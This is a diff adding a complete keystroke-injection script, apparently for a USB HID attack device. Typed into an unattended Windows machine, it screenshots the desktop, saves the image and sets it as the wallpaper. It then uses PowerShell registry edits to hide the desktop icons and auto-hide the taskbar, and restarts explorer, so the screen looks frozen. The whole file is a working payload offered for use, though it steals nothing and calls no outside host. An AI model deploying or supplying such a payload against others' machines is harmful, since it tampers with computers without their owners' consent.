@@ -1,0 +1,50 @@
+DELAY 500
+PRINTSCREEN
+DELAY 100
+GUI r
+DELAY 500
+STRING mspaint
+DELAY 100
+ENTER
+DELAY 500
+CONTROL v
+DELAY 100
+ESCAPE
+DELAY 100
+CONTROL s
+DELAY 500
+STRING freezeframe.png
+DELAY 500
+ENTER
+DELAY 500
+ALT f
+DELAY 300
+ALT b
+DELAY 100
+ALT F4
+DELAY 100
+GUI r
+DELAY 500
+STRING powershell
+DELAY 100
+ENTER
+DELAY 500
+STRING $Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+DELAY 10
+ENTER
+DELAY 100
+STRING Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1
+DELAY 100
+ENTER
+DELAY 100
+STRING &{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3';$v=(Get-ItemProperty -Path $p).Settings;$v[8]=3;&Set-ItemProperty -Path $p -Name Settings -Value $v;&Stop-Process -f -ProcessName explorer}
+DELAY 100
+ENTER 
+DELAY 100
+STRING Get-Process "explorer"| Stop-Process
+DELAY 100
+ENTER
+DELAY 100
+STRING exit
+DELAY 100
+ENTER
